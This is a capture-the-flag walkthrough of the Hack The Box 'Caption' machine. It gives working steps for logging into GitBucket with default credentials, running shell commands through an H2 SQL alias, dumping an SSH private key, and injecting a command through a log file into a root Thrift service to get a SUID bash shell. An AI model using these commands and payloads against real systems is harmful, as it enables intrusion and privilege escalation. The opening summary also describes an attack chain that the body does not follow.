---
author: Amal PK
pubDatetime: 2025-07-07T07:46:11.812Z
title: "Caption HackTheBox Writeup"
draft: false
tags:
  - "hackthebox"
  - "linux"
  - "cybersecurity"
  - "hacking"
  - "github"
description: "HTB Caption walkthrough: Exploit GitBucket default creds, abuse H2 DB for RCE, and escalate to root using a Thrift log parser vulnerability."
collection: hack-the-box/linux
---

![Hack The Box Caption Linux machine write-up cover image](/images/posts/caption-hackthebox-writeup/image-1.webp)

# Caption HackTheBox Writeup

> Caption is a Hard-difficulty Linux box, showcasing the chaining of niche vulnerabilities arising from different technologies such as HAProxy and Varnish. It begins with default credentials granting access to GitBucket, which exposes credentials for a web portal login through commits. The application caches a frequently visited page by an admin user, whose session can be hijacked by exploiting Web Cache Deception (WCD) via response poisoning exploited through a Cross-Site Scripting (XSS) payload. HAProxy controls can be bypassed by establishing an HTTP/2 cleartext tunnel, also known as an H2C Smuggling Attack, enabling the exploitation of a locally running service vulnerable to path traversal (\[CVE-2023-37474\]([https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718](https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718))). A foothold is gained by reading the SSH ECDSA private key. Root privileges are obtained by exploiting a command injection vulnerability in the Apache Thrift service running as root.

### **Machine Info:**

> _**IP:**_ `10.10.11.33`  
> **Difficulty**: Hard  
> **OS**: Linux  
> **Category**:

## Enumeration

### _Nmap Scan_

```jsx
Nmap scan report for caption.htb (10.10.11.33)
Host is up (0.76s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

The initial enumeration of _caption.htb_ reveals three open ports:

- _22/tcp_ - SSH

- _80/tcp_ - HTTP (Caption Portal Login)

- _8080/tcp_ - GitBucket (Web App)

Navigating to `http://caption.htb:8080` displays the GitBucket login interface.

### _GitBucket Exploit_

- _Credentials_: root:root (Defailt creds for gitbucket)

Once logged in, you find a commit disclosing a password for the user "margo":

- _User_: `margo`

- _Password_: `vFr&cS2#0!`

You also discover an _H2 database_ viewer at:

- [http://caption.htb:8080/admin/dbviewer](http://caption.htb:8080/admin/dbviewer)

## Command Execution via H2 Database

H2 allows defining custom Java methods via SQL aliases. A remote command execution alias is created

```sql
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
return s.hasNext() ? s.next() : "";
}
$$;
```

Executing commands:

```sql
CALL SHELLEXEC('id');
```

Returns:

```bash
uid=1000(margo) gid=1000(margo) groups=1000(margo)
```

We can also dump the _SSH private key_ of the user "margo":

```sql
CALL SHELLEXEC('cat /home/margo/.ssh/id_ecdsa');
```

### _SSH Access_

Extract the private key, save it, and adjust permissions:

```bash
cat <<EOF > id_ecdsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQSANe5kEY+DN1xSvPtTZVur+DWGq94h1gSFMvzv5iec
YwuC7ymT7QWZM+42IIVZQ5GqkIE5uLHyqtVKytQu5aCLAAAAoACUCKoAlAiqAAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIA17mQRj4M3XFK8+1NlW6v4NYar3iHWBIUy/O/m
J5xjC4LvKZPtBZkz7jYghVlDkaqQgTm4sfKq1UrK1C7loIsAAAAhAOZNLY0cYdeM6shGDro9tude
7oBNK+hIIh0AmL8JK+ShAAAAAAECAwQFBgc=
-----END OPENSSH PRIVATE KEY-----
EOF
```

Save and chmod the key locally:

```powershell
chmod 600 id_ecdsa
ssh -i id_ecdsa margo@caption.htb
```

## Internal Enumeration & Port Forwarding

To enumerate internal services, set up port forwarding to access internal services:

```bash
ssh -i id_ecdsa -L 9090:127.0.0.1:9090 margo@caption.htb
```

This reveals a Thrift-based service running locally.

## Privilege Escalation: Log Parser Exploitation

To escalate privileges, we can exploit log parsing to run a payload.

_Step 1: Create Malicious Log File_

```bash
echo '127.0.0.1 "user-agent":"'; /bin/bash /tmp/payload.sh #' > /tmp/malicious.log
```

_Step 2: Create Payload Script_

```bash
echo 'chmod +s /bin/bash' > /tmp/payload.sh
```

```bash
pip download thrift
```

```bash
scp -i /home/kratos/HTB/Caption/id_ecdsa thrift-*.tar.gz margo@caption.htb:/tmp
thrift-0.20.0.tar.gz
```

### _Thrift Client Setup_

Create a _Thrift_ file log\_service.thrift:

```python
thrift
namespace go log_service

service LogService {
string ReadLogFile(1: string filePath)
}
```

Generate the Thrift client:

```bash
thrift -r --gen py log_service.thrift
```

Create a Python client [client.py](http://client.py/):

```python
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService

def main():
    transport = TSocket.TSocket('localhost', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)
    client = LogService.Client(protocol)
    transport.open()

    try:
        log_file_path = "/tmp/malicious.log"
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)
    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")
    transport.close()

if __name__ == '__main__':
    main()
```

Install Thrift and run the client:

```bash
pip3 install thrift
python3 [client.py](<http://client.py/>)
```

_Output:_

`Server response: Log file processed`

### _Privilege Escalation_

After the malicious payload runs, verify the SUID bit on /bin/bash:

```bash
ls -l /bin/bash
/bin/bash -p
whoami
```

You are now root.

## Conclusion

The Caption box illustrates how default credentials, exposed development tools, and improper log parsing can lead to full system compromise. It starts with accessing GitBucket using factory credentials, leading to remote code execution via the H2 console. With a foothold as `margo`, the attacker leverages an insecure Thrift service to escalate privileges by crafting a malicious log file that executes commands with elevated permissions.
